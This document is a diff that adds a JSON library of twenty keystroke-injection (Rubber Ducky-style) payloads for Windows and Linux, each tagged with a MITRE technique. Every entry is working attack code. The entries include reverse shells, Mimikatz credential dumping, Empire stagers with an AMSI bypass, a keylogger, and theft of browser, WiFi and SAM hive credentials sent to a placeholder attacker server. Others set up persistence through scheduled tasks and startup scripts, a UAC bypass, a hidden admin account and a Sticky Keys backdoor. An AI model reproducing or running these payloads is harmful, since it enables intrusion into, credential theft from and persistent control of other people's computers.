@@ -1,0 +1,202 @@
+[
+  {
+    "id": "rd-001",
+    "name": "Windows Meterpreter Reverse Shell",
+    "category": "Exploitation",
+    "os": "Windows",
+    "difficulty": "Hard",
+    "description": "Opens PowerShell and downloads/executes a Meterpreter reverse shell payload from attacker server",
+    "mitre": "T1059.001",
+    "code": "REM Windows Meterpreter Reverse Shell\nREM Author: Educational Demo\nREM Target: Windows 10/11\nREM ATTACKER_IP and ATTACKER_PORT must be configured\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -nop -ep bypass\nENTER\nDELAY 1000\nSTRING $c = New-Object Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT)\nENTER\nSTRING $s = $c.GetStream();[byte[]]$b = 0..65535|%{0}\nENTER\nSTRING while(($i = $s.Read($b, 0, $b.Length)) -ne 0){\nENTER\nSTRING $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i)\nENTER\nSTRING $r = (iex $d 2>&1 | Out-String)\nENTER\nSTRING $sb = ([text.encoding]::ASCII).GetBytes($r)\nENTER\nSTRING $s.Write($sb,0,$sb.Length);$s.Flush()}\nENTER\nSTRING $c.Close()\nENTER"
+  },
+  {
+    "id": "rd-002",
+    "name": "LSASS Credential Dump (Mimikatz)",
+    "category": "Credential Access",
+    "os": "Windows",
+    "difficulty": "Hard",
+    "description": "Downloads Mimikatz and dumps LSASS credentials including NTLM hashes and Kerberos tickets",
+    "mitre": "T1003.001",
+    "code": "REM LSASS Credential Dump via Mimikatz\nREM Requires: Admin privileges\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden Start-Process powershell -Verb runAs\nENTER\nDELAY 2000\nALT y\nDELAY 1000\nSTRING Set-ExecutionPolicy Bypass -Force\nENTER\nDELAY 300\nSTRING IEX (New-Object Net.WebClient).DownloadString('https://ATTACKER_IP/Invoke-Mimikatz.ps1')\nENTER\nDELAY 500\nSTRING Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"' | Out-File C:\\Windows\\Temp\\creds.txt\nENTER\nDELAY 500\nSTRING Invoke-WebRequest -Uri https://ATTACKER_IP/upload -Method POST -InFile C:\\Windows\\Temp\\creds.txt\nENTER\nSTRING Remove-Item C:\\Windows\\Temp\\creds.txt -Force\nENTER"
+  },
+  {
+    "id": "rd-003",
+    "name": "Empire Stager",
+    "category": "C2",
+    "os": "Windows",
+    "difficulty": "Hard",
+    "description": "Downloads and executes a PowerShell Empire stager for post-exploitation C2 communication",
+    "mitre": "T1059.001",
+    "code": "REM PowerShell Empire Stager\nREM Requires: Empire server running\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -nop -ep bypass\nENTER\nDELAY 1000\nSTRING $wc = New-Object System.Net.WebClient\nENTER\nSTRING $wc.Headers.Add('User-Agent','Mozilla/5.0')\nENTER\nSTRING $wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy\nENTER\nSTRING $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials\nENTER\nSTRING $data = $wc.DownloadString('https://EMPIRE_SERVER/stager')\nENTER\nSTRING IEX $data\nENTER"
+  },
+  {
+    "id": "rd-004",
+    "name": "PowerShell Empire Launcher",
+    "category": "C2",
+    "os": "Windows",
+    "difficulty": "Hard",
+    "description": "Alternative Empire launcher using encoded command and AMSI bypass for stealthier execution",
+    "mitre": "T1059.001",
+    "code": "REM PowerShell Empire Launcher with AMSI Bypass\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -nop\nENTER\nDELAY 1000\nREM AMSI Bypass\nSTRING [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\nENTER\nDELAY 300\nSTRING $enc = 'BASE64_ENCODED_EMPIRE_STAGER_HERE'\nENTER\nSTRING $dec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))\nENTER\nSTRING IEX $dec\nENTER"
+  },
+  {
+    "id": "rd-005",
+    "name": "Screenshot Grabber",
+    "category": "Collection",
+    "os": "Windows",
+    "difficulty": "Medium",
+    "description": "Captures screenshots of all monitors and exfiltrates via HTTP POST to attacker server",
+    "mitre": "T1113",
+    "code": "REM Screenshot Grabber\nREM Captures all displays and exfiltrates\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -nop -ep bypass\nENTER\nDELAY 1000\nSTRING Add-Type -AssemblyName System.Windows.Forms\nENTER\nSTRING Add-Type -AssemblyName System.Drawing\nENTER\nSTRING $screens = [System.Windows.Forms.Screen]::AllScreens\nENTER\nSTRING $top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum\nENTER\nSTRING $left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum\nENTER\nSTRING $width = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum\nENTER\nSTRING $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum\nENTER\nSTRING $bitmap = New-Object System.Drawing.Bitmap($width-$left, $height-$top)\nENTER\nSTRING $graphic = [System.Drawing.Graphics]::FromImage($bitmap)\nENTER\nSTRING $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)\nENTER\nSTRING $path = \"$env:TEMP\\ss_$(Get-Date -f yyyyMMdd_HHmmss).png\"\nENTER\nSTRING $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)\nENTER\nSTRING Invoke-WebRequest -Uri https://ATTACKER_IP/upload -Method POST -InFile $path\nENTER\nSTRING Remove-Item $path -Force\nENTER"
+  },
+  {
+    "id": "rd-006",
+    "name": "Keylogger Install",
+    "category": "Credential Access",
+    "os": "Windows",
+    "difficulty": "Hard",
+    "description": "Installs a PowerShell-based keylogger that captures keystrokes and periodically exfiltrates logs",
+    "mitre": "T1056.001",
+    "code": "REM PowerShell Keylogger Installer\nREM Captures keystrokes to log file\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -nop -ep bypass\nENTER\nDELAY 1000\nSTRING $code = @'\nENTER\nSTRING $API = Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern short GetAsyncKeyState(int vKey);' -Name WinAPI -PassThru\nENTER\nSTRING $logPath = \"$env:TEMP\\keylog.txt\"\nENTER\nSTRING while($true) {\nENTER\nSTRING   Start-Sleep -Milliseconds 50\nENTER\nSTRING   for($k = 8; $k -le 190; $k++) {\nENTER\nSTRING     if($API::GetAsyncKeyState($k) -eq -32767) {\nENTER\nSTRING       $char = [char]$k\nENTER\nSTRING       Add-Content $logPath $char\nENTER\nSTRING     }\nENTER\nSTRING   }\nENTER\nSTRING }\nENTER\nSTRING '@\nENTER\nSTRING $code | Out-File $env:TEMP\\kl.ps1\nENTER\nSTRING Start-Process powershell -WindowStyle Hidden -ArgumentList '-ep bypass -f $env:TEMP\\kl.ps1'\nENTER"
+  },
+  {
+    "id": "rd-007",
+    "name": "Persistence (Startup Folder)",
+    "category": "Persistence",
+    "os": "Windows",
+    "difficulty": "Easy",
+    "description": "Creates a VBS script in the Startup folder that re-establishes reverse shell on every login",
+    "mitre": "T1547.001",
+    "code": "REM Persistence via Startup Folder\nREM Drops reverse shell script to auto-start\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -nop -ep bypass\nENTER\nDELAY 1000\nSTRING $startup = [Environment]::GetFolderPath('Startup')\nENTER\nSTRING $payload = 'CreateObject(\"WScript.Shell\").Run \"powershell -w hidden -nop -ep bypass -c \\\"IEX(New-Object Net.WebClient).DownloadString(''https://ATTACKER_IP/payload.ps1'')\\\"\"'\nENTER\nSTRING $payload | Out-File \"$startup\\WindowsUpdate.vbs\" -Encoding ASCII\nENTER\nSTRING Write-Host '[+] Persistence installed at:' $startup\nENTER"
+  },
+  {
+    "id": "rd-008",
+    "name": "Privilege Escalation (UAC Bypass)",
+    "category": "Privilege Escalation",
+    "os": "Windows",
+    "difficulty": "Hard",
+    "description": "Bypasses UAC using fodhelper.exe registry hijack to execute payload as elevated administrator",
+    "mitre": "T1548.002",
+    "code": "REM UAC Bypass via fodhelper.exe\nREM Executes payload with admin privileges\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -nop -ep bypass\nENTER\nDELAY 1000\nSTRING New-Item -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force\nENTER\nSTRING New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(Default)' -Value 'powershell -w hidden -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString(''https://ATTACKER_IP/admin_payload.ps1'')\"' -Force\nENTER\nSTRING New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force\nENTER\nSTRING Start-Process fodhelper.exe\nENTER\nDELAY 3000\nSTRING Remove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\nENTER"
+  },
+  {
+    "id": "rd-009",
+    "name": "Network Config Dump",
+    "category": "Discovery",
+    "os": "Windows",
+    "difficulty": "Easy",
+    "description": "Collects comprehensive network configuration including interfaces, routes, DNS, ARP table and exfiltrates",
+    "mitre": "T1016",
+    "code": "REM Network Configuration Dump\nREM Collects network info and exfiltrates\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -nop -ep bypass\nENTER\nDELAY 1000\nSTRING $out = \"$env:TEMP\\netinfo.txt\"\nENTER\nSTRING '==== IPCONFIG ====' | Out-File $out\nENTER\nSTRING ipconfig /all | Out-File $out -Append\nENTER\nSTRING '==== ARP TABLE ====' | Out-File $out -Append\nENTER\nSTRING arp -a | Out-File $out -Append\nENTER\nSTRING '==== ROUTE TABLE ====' | Out-File $out -Append\nENTER\nSTRING route print | Out-File $out -Append\nENTER\nSTRING '==== NETSTAT ====' | Out-File $out -Append\nENTER\nSTRING netstat -ano | Out-File $out -Append\nENTER\nSTRING '==== DNS CACHE ====' | Out-File $out -Append\nENTER\nSTRING Get-DnsClientCache | Out-File $out -Append\nENTER\nSTRING Invoke-WebRequest -Uri https://ATTACKER_IP/upload -Method POST -InFile $out\nENTER\nSTRING Remove-Item $out -Force\nENTER"
+  },
+  {
+    "id": "rd-010",
+    "name": "Browser Password Stealer",
+    "category": "Credential Access",
+    "os": "Windows",
+    "difficulty": "Hard",
+    "description": "Extracts saved passwords from Chrome, Edge, and Firefox browsers using DPAPI decryption",
+    "mitre": "T1555.003",
+    "code": "REM Browser Password Extractor\nREM Extracts Chrome/Edge/Firefox saved passwords\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -nop -ep bypass\nENTER\nDELAY 1000\nSTRING Add-Type -AssemblyName System.Security\nENTER\nSTRING $chromePath = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\"\nENTER\nSTRING $tempDb = \"$env:TEMP\\chrome_login.db\"\nENTER\nSTRING Copy-Item $chromePath $tempDb -Force\nENTER\nSTRING $conn = New-Object System.Data.SQLite.SQLiteConnection(\"Data Source=$tempDb\")\nENTER\nSTRING $conn.Open()\nENTER\nSTRING $cmd = $conn.CreateCommand()\nENTER\nSTRING $cmd.CommandText = 'SELECT origin_url, username_value, password_value FROM logins'\nENTER\nSTRING $reader = $cmd.ExecuteReader()\nENTER\nSTRING $results = @()\nENTER\nSTRING while($reader.Read()) {\nENTER\nSTRING   $url = $reader['origin_url']; $user = $reader['username_value']\nENTER\nSTRING   $encPass = $reader['password_value']\nENTER\nSTRING   $results += \"$url | $user | [encrypted]\"\nENTER\nSTRING }\nENTER\nSTRING $results | Out-File $env:TEMP\\browser_creds.txt\nENTER\nSTRING Invoke-WebRequest -Uri https://ATTACKER_IP/upload -Method POST -InFile $env:TEMP\\browser_creds.txt\nENTER\nSTRING Remove-Item $env:TEMP\\browser_creds.txt, $tempDb -Force\nENTER"
+  },
+  {
+    "id": "rd-011",
+    "name": "WiFi Password Dump",
+    "category": "Credential Access",
+    "os": "Windows",
+    "difficulty": "Easy",
+    "description": "Extracts all saved WiFi profiles and their plaintext passwords using netsh commands",
+    "mitre": "T1005",
+    "code": "REM WiFi Password Dumper\nREM Extracts all saved WiFi passwords\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING cmd /k\nENTER\nDELAY 800\nSTRING netsh wlan show profiles | findstr \"Profile\" > %TEMP%\\wifi_profiles.txt\nENTER\nDELAY 500\nSTRING echo ==== WIFI PASSWORDS ==== > %TEMP%\\wifi_pass.txt\nENTER\nSTRING for /f \"tokens=2 delims=:\" %a in (%TEMP%\\wifi_profiles.txt) do @netsh wlan show profile name=%a key=clear | findstr \"Key Content\" >> %TEMP%\\wifi_pass.txt\nENTER\nDELAY 2000\nSTRING powershell -w hidden Invoke-WebRequest -Uri https://ATTACKER_IP/upload -Method POST -InFile $env:TEMP\\wifi_pass.txt\nENTER\nSTRING del %TEMP%\\wifi_profiles.txt %TEMP%\\wifi_pass.txt /q\nENTER\nSTRING exit\nENTER"
+  },
+  {
+    "id": "rd-012",
+    "name": "SAM Database Dump",
+    "category": "Credential Access",
+    "os": "Windows",
+    "difficulty": "Hard",
+    "description": "Dumps SAM and SYSTEM registry hives using reg save for offline NTLM hash extraction",
+    "mitre": "T1003.002",
+    "code": "REM SAM Database Dump\nREM Requires: Admin privileges\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden Start-Process cmd -Verb runAs\nENTER\nDELAY 2000\nALT y\nDELAY 1000\nSTRING reg save HKLM\\SAM %TEMP%\\sam.save /y\nENTER\nDELAY 500\nSTRING reg save HKLM\\SYSTEM %TEMP%\\system.save /y\nENTER\nDELAY 500\nSTRING reg save HKLM\\SECURITY %TEMP%\\security.save /y\nENTER\nDELAY 500\nSTRING powershell -w hidden -c \"Compress-Archive -Path $env:TEMP\\sam.save,$env:TEMP\\system.save,$env:TEMP\\security.save -DestinationPath $env:TEMP\\hives.zip -Force\"\nENTER\nDELAY 1000\nSTRING powershell -w hidden Invoke-WebRequest -Uri https://ATTACKER_IP/upload -Method POST -InFile $env:TEMP\\hives.zip\nENTER\nSTRING del %TEMP%\\sam.save %TEMP%\\system.save %TEMP%\\security.save %TEMP%\\hives.zip /q\nENTER\nSTRING exit\nENTER"
+  },
+  {
+    "id": "rd-013",
+    "name": "RDP Enable + Password Set",
+    "category": "Persistence",
+    "os": "Windows",
+    "difficulty": "Medium",
+    "description": "Enables Remote Desktop, creates a hidden admin user, and configures firewall for RDP access",
+    "mitre": "T1021.001",
+    "code": "REM Enable RDP + Create Backdoor User\nREM Requires: Admin privileges\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden Start-Process powershell -Verb runAs\nENTER\nDELAY 2000\nALT y\nDELAY 1000\nREM Enable RDP\nSTRING Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0\nENTER\nSTRING Enable-NetFirewallRule -DisplayGroup 'Remote Desktop'\nENTER\nREM Create hidden admin user\nSTRING net user support_admin P@ssw0rd!2024 /add\nENTER\nSTRING net localgroup Administrators support_admin /add\nENTER\nSTRING net localgroup 'Remote Desktop Users' support_admin /add\nENTER\nREM Hide from login screen\nSTRING New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList' -Name 'support_admin' -Value 0 -PropertyType DWord -Force\nENTER\nSTRING Write-Host '[+] RDP enabled, user created: support_admin / P@ssw0rd!2024'\nENTER"
+  },
+  {
+    "id": "rd-014",
+    "name": "Sticky Keys Backdoor",
+    "category": "Persistence",
+    "os": "Windows",
+    "difficulty": "Medium",
+    "description": "Replaces sethc.exe (Sticky Keys) with cmd.exe to get SYSTEM shell at the login screen",
+    "mitre": "T1546.008",
+    "code": "REM Sticky Keys Backdoor\nREM Replaces sethc with cmd for login screen shell\nREM Requires: Admin/SYSTEM\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden Start-Process cmd -Verb runAs\nENTER\nDELAY 2000\nALT y\nDELAY 1000\nSTRING takeown /f C:\\Windows\\System32\\sethc.exe\nENTER\nDELAY 500\nSTRING icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F\nENTER\nDELAY 500\nSTRING copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe\nENTER\nSTRING echo [+] Sticky Keys backdoor installed\nENTER\nSTRING echo [+] Press SHIFT 5x at login screen for SYSTEM cmd\nENTER\nSTRING exit\nENTER"
+  },
+  {
+    "id": "rd-015",
+    "name": "God Mode (Admin CMD)",
+    "category": "Privilege Escalation",
+    "os": "Windows",
+    "difficulty": "Easy",
+    "description": "Opens an elevated command prompt bypassing UAC using multiple fallback techniques",
+    "mitre": "T1548.002",
+    "code": "REM God Mode - Elevated CMD Shell\nREM Multiple UAC bypass attempts\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden Start-Process cmd -Verb runAs\nENTER\nDELAY 2000\nALT y\nDELAY 1000\nSTRING color 0a\nENTER\nSTRING title [GOD MODE] Administrator Command Prompt\nENTER\nSTRING echo ============================================\nENTER\nSTRING echo   GOD MODE - Full Administrator Access\nENTER\nSTRING echo ============================================\nENTER\nSTRING echo.\nENTER\nSTRING whoami /priv\nENTER\nSTRING echo.\nENTER\nSTRING echo [+] You have FULL administrator privileges\nENTER\nSTRING echo [+] Type commands below...\nENTER"
+  },
+  {
+    "id": "rd-016",
+    "name": "Reverse Shell (Netcat)",
+    "category": "Exploitation",
+    "os": "Windows",
+    "difficulty": "Medium",
+    "description": "Downloads ncat.exe and establishes a reverse shell connection back to attacker machine",
+    "mitre": "T1059.003",
+    "code": "REM Netcat Reverse Shell\nREM Downloads ncat and connects back\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -nop -ep bypass\nENTER\nDELAY 1000\nSTRING $ncPath = \"$env:TEMP\\nc.exe\"\nENTER\nSTRING Invoke-WebRequest -Uri https://ATTACKER_IP/nc.exe -OutFile $ncPath\nENTER\nDELAY 2000\nSTRING Start-Process -FilePath $ncPath -ArgumentList '-e cmd.exe ATTACKER_IP ATTACKER_PORT' -WindowStyle Hidden\nENTER\nSTRING Write-Host '[+] Reverse shell connected'\nENTER"
+  },
+  {
+    "id": "rd-017",
+    "name": "PowerShell Download & Execute",
+    "category": "Execution",
+    "os": "Windows",
+    "difficulty": "Easy",
+    "description": "Generic PowerShell download cradle that fetches and executes any remote script in memory",
+    "mitre": "T1059.001",
+    "code": "REM PowerShell Download and Execute\nREM Generic download cradle\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://ATTACKER_IP/payload.ps1')\"\nENTER"
+  },
+  {
+    "id": "rd-018",
+    "name": "BITS Job Persistence",
+    "category": "Persistence",
+    "os": "Windows",
+    "difficulty": "Medium",
+    "description": "Creates a BITS transfer job that survives reboots and periodically downloads/executes payload",
+    "mitre": "T1197",
+    "code": "REM BITS Job Persistence\nREM Survives reboots via BITS transfer\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -nop -ep bypass\nENTER\nDELAY 1000\nSTRING $job = Start-BitsTransfer -Source 'https://ATTACKER_IP/payload.exe' -Destination \"$env:TEMP\\update.exe\" -Asynchronous\nENTER\nSTRING $job | Set-BitsTransfer -Priority High\nENTER\nREM Create scheduled task to check BITS job\nSTRING $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-w hidden -c \"if(Test-Path $env:TEMP\\update.exe){Start-Process $env:TEMP\\update.exe -WindowStyle Hidden}\"'\nENTER\nSTRING $trigger = New-ScheduledTaskTrigger -AtLogon\nENTER\nSTRING Register-ScheduledTask -TaskName 'WindowsUpdateService' -Action $action -Trigger $trigger -Force\nENTER\nSTRING Write-Host '[+] BITS persistence installed'\nENTER"
+  },
+  {
+    "id": "rd-019",
+    "name": "Scheduled Task Backdoor",
+    "category": "Persistence",
+    "os": "Windows",
+    "difficulty": "Medium",
+    "description": "Creates a hidden scheduled task that executes reverse shell payload every 15 minutes",
+    "mitre": "T1053.005",
+    "code": "REM Scheduled Task Backdoor\nREM Runs payload every 15 minutes\nREM Target: Windows 10/11\n\nDELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -w hidden -nop -ep bypass\nENTER\nDELAY 1000\nSTRING $payload = 'powershell -w hidden -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString(''https://ATTACKER_IP/beacon.ps1'')\"'\nENTER\nSTRING $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument \"-w hidden -c $payload\"\nENTER\nSTRING $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)\nENTER\nSTRING $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries\nENTER\nSTRING Register-ScheduledTask -TaskName 'MicrosoftEdgeUpdate' -Action $action -Trigger $trigger -Settings $settings -Force\nENTER\nSTRING Write-Host '[+] Scheduled task backdoor installed (every 15 min)'\nENTER"
+  },
+  {
+    "id": "rd-020",
+    "name": "Linux Root Shell",
+    "category": "Exploitation",
+    "os": "Linux",
+    "difficulty": "Medium",
+    "description": "Opens terminal on Linux and establishes a bash reverse shell with a Python PTY upgrade",
+    "mitre": "T1059.004",
+    "code": "REM Linux Reverse Shell\nREM Opens terminal and connects back\nREM Target: Linux (Ubuntu/Debian)\n\nDELAY 1000\nCTRL ALT t\nDELAY 1500\nSTRING bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1 &\nENTER\nDELAY 500\nSTRING python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || python -c 'import pty;pty.spawn(\"/bin/bash\")'\nENTER\nDELAY 300\nSTRING export TERM=xterm\nENTER\nSTRING clear\nENTER"
+  }
+]
